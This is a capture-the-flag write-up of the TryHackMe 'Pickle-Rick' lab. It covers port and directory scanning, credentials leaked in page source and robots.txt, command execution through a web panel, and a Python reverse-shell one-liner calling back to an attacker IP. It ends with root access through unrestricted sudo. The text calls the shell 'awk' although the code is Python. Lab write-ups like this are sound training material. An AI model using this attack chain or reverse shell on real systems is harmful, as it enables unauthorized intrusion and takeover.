# Pickle-Rick

**IP:** 10.10.84.215  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 31/05/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.84.215 -oA nmap/Pickle-Rick
```

| Port | Service | Version |
|------|---------|---------|
| 22 | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 80 | http | Apache httpd 2.4.41 |

## Enumeration

Username `R1ckRul3s` in the web page source (:80).
```html
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

Found `/login.php` and `/robots.txt` and more.
```bash
ffuf -u http://10.10.70.181:80/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -s -fc 403 -fs 1062 -e .html,.txt,.php --noninteractive 

login.php
assets
portal.php
robots.txt
denied.php
```

## Exploitation

`robots.txt` contained "`Wubbalubbadubdub`".
```bash
wget http://10.10.70.181/robots.txt -q;cat robots.txt

Wubbalubbadubdub
```

Which I then used in combination with the username  `R1ckRul3s` at `/login.php` to give me access to `/portal.php`, where there was a Control Panel with a code execution prompt.
![[Pasted image 20250601084301.png]]
I used an `awk` reverse shell to use commands and navigate the file system easier.
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.23.121.106",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

`cat` was blacklisted, so I used the `read` command in a while loop to read files. `Sup3rS3cretPickl3Ingred.txt` contains the first ingredient.

```
while read line; do echo $line; done <Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

The second ingredient was in `rick`'s home directory `/home/rick`.
```
ls -la /home/rick
...
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients

while read line; do echo $line; done <'/home/rick/second ingredients'
1 jerry tear
```

`www-data` had full NOPASSWD sudo permissions
```
whoami 
www-data

sudo -l

Matching Defaults entries for www-data on ip-10-10-92-104:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-92-104:
    (ALL) NOPASSWD: ALL
```

## Privilege Escalation

So just switched to the `root` user 
```
sudo bash -i

id
uid=0(root) gid=0(root) groups=0(root)
```

Used `sudo` to find and read the third ingredient in `/root/3rd.txt`
```
sudo ls /root
3rd.txt  snap

while read line; do echo $line; done </'/root/3rd.txt'
3rd ingredients: fleeb juice
```

---

#nmap #ffuf #command-injection #reverse-shell #sudo-privesc #directory-fuzzing #source-code-enum #thm